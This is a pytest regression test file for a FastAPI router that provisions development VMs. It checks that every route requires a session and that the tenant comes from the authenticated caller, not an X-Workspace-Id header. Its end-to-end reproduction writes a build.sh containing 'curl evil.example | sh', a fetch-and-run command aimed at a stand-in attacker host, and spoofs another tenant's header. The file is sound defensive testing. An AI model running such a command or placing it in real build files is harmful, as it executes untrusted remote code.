"""The Daytona router must authenticate, and must not take its tenant from a header.

Thirteen routes on this router shipped with no session guard of any kind, while
``_resolve_workspace_id`` read the tenant out of an ``X-Workspace-Id`` header and
fell back to the literal string ``"default"``. Among them: provision, destroy, a
terminal into the VM, and read/write/rename/delete of files inside it. An
unauthenticated caller could write a file into another tenant's development VM by
naming their workspace in a header, and that VM executes the file on its next
build.

The router-wide auth audit (tests/cloud/auth/test_route_auth_audit.py) exists to
catch exactly this and did not, because its ``ROUTER_MODULES`` is a hand-typed
list and this router was never added to it. That gap is fixed there; this file is
the specific gate, kept separate so a regression here is unmistakable.

Two properties, because passing one without the other still leaves the hole:

  1. every route requires a session, and
  2. the workspace comes from the resolved caller, so the header cannot choose it.

Property 2 is the one a naive fix misses. Adding a session dependency while
leaving ``_resolve_workspace_id`` in place authenticates the caller and then still
lets them act on any tenant they name.

Mutations that must fail these tests: dropping the ``current_workspace_id``
dependency from any handler, and reinstating a header read for the workspace.
"""

from __future__ import annotations

import importlib

import pytest
from fastapi import FastAPI
from fastapi.routing import APIRoute
from httpx import ASGITransport, AsyncClient
from pocketpaw_ee.cloud._core.context import loopback_or_request_context, request_context
from pocketpaw_ee.cloud._core.deps import current_workspace_id
from pocketpaw_ee.cloud.auth.core import current_active_user

# Same identity-based walk the router-wide audit uses. Copied rather than
# imported so this gate does not go quiet if that file is refactored.
SESSION_GUARDS = frozenset(
    {id(current_active_user), id(request_context), id(loopback_or_request_context)}
)


def _requires_auth(dependant, seen: set[int] | None = None) -> bool:
    seen = seen if seen is not None else set()
    if id(dependant) in seen:
        return False
    seen.add(id(dependant))
    if id(dependant.call) in SESSION_GUARDS:
        return True
    return any(_requires_auth(d, seen) for d in dependant.dependencies)


@pytest.fixture
def daytona_router():
    return importlib.import_module("pocketpaw_ee.cloud.daytona.router").router


def test_every_daytona_route_requires_a_session(daytona_router):
    routes = [r for r in daytona_router.routes if isinstance(r, APIRoute)]
    assert routes, "expected the daytona router to expose HTTP routes"

    unguarded = [
        f"{sorted(r.methods or {'ANY'})[0]} {r.path}"
        for r in routes
        if not _requires_auth(r.dependant)
    ]
    assert unguarded == [], (
        "Daytona routes reachable with no session. These provision, destroy and "
        "write files inside customer VMs:\n  " + "\n  ".join(unguarded)
    )


def test_every_daytona_route_resolves_the_workspace_from_the_caller(daytona_router):
    """Not just 'some auth dep' — the workspace itself must come from the session.

    A route could satisfy the test above through any session guard while still
    reading its tenant from somewhere the caller controls.
    """
    routes = [r for r in daytona_router.routes if isinstance(r, APIRoute)]
    missing = [
        f"{sorted(r.methods or {'ANY'})[0]} {r.path}"
        for r in routes
        if not any(d.call is current_workspace_id for d in r.dependant.dependencies)
    ]
    assert missing == [], (
        "Daytona routes that do not take the workspace from the authenticated "
        "caller:\n  " + "\n  ".join(missing)
    )


def test_the_router_never_reads_a_request_header():
    """No header read of any kind, not merely no ``X-Workspace-Id``.

    Asserted against the parsed module rather than its text, so the docstring
    can name the old header while explaining the boundary. A string search
    cannot tell an explanation from a live read.
    """
    import ast

    module = importlib.import_module("pocketpaw_ee.cloud.daytona.router")
    assert not hasattr(module, "_resolve_workspace_id"), (
        "_resolve_workspace_id read the tenant out of a request header; it must not come back"
    )

    tree = ast.parse(importlib.import_module("inspect").getsource(module))
    reads = [
        f"line {node.lineno}"
        for node in ast.walk(tree)
        if isinstance(node, ast.Attribute) and node.attr == "headers"
    ]
    reads += [
        f"line {node.lineno}"
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == "Header"
    ]
    assert reads == [], (
        "the router reads a request header. Nothing the caller writes may "
        f"influence which sandbox a route reaches: {reads}"
    )


async def test_a_header_cannot_redirect_a_write_at_another_tenants_vm(monkeypatch):
    """The reproduction, end to end: authenticate as one tenant, name another.

    Before the fix this wrote into ``ws-victim``'s sandbox. After it, the header
    is inert and every store lookup is scoped to the caller's own workspace.
    """
    module = importlib.import_module("pocketpaw_ee.cloud.daytona.router")
    store = importlib.import_module("pocketpaw_ee.cloud.daytona.store")

    seen: list[str] = []

    async def _record_sandbox_id(workspace_id: str) -> str:
        seen.append(workspace_id)
        return "sandbox-of-" + workspace_id

    async def _config(workspace_id: str) -> dict:
        seen.append(workspace_id)
        return {"root_dir": "/workspace"}

    monkeypatch.setattr(store, "get_workspace_vm_sandbox_id", _record_sandbox_id)
    monkeypatch.setattr(store, "get_workspace_vm_config", _config)
    monkeypatch.setattr(module, "daytona_enabled", lambda: True)

    written: list[tuple[str, bytes]] = []

    class _Client:
        async def get_sandbox_by_id(self, sandbox_id: str):
            from types import SimpleNamespace

            return SimpleNamespace(state="started", id=sandbox_id)

        async def create_folder(self, sandbox_id: str, path: str) -> None:
            return None

        async def upload_bytes(self, sandbox_id: str, content: bytes, path: str) -> None:
            written.append((sandbox_id, content))

    monkeypatch.setattr(module, "get_daytona_client", lambda: _Client())

    app = FastAPI()
    app.include_router(module.router)
    app.dependency_overrides[current_workspace_id] = lambda: "ws-attacker"

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://t") as client:
        response = await client.post(
            "/cloud/projects/victim-project/vm/files/write",
            json={"path": "build.sh", "content": "curl evil.example | sh"},
            headers={"X-Workspace-Id": "ws-victim"},
        )

    assert response.status_code == 200, response.text
    assert "ws-victim" not in seen, f"the header chose the tenant: store lookups ran against {seen}"
    assert seen and set(seen) == {"ws-attacker"}, seen
    assert written == [("sandbox-of-ws-attacker", b"curl evil.example | sh")]
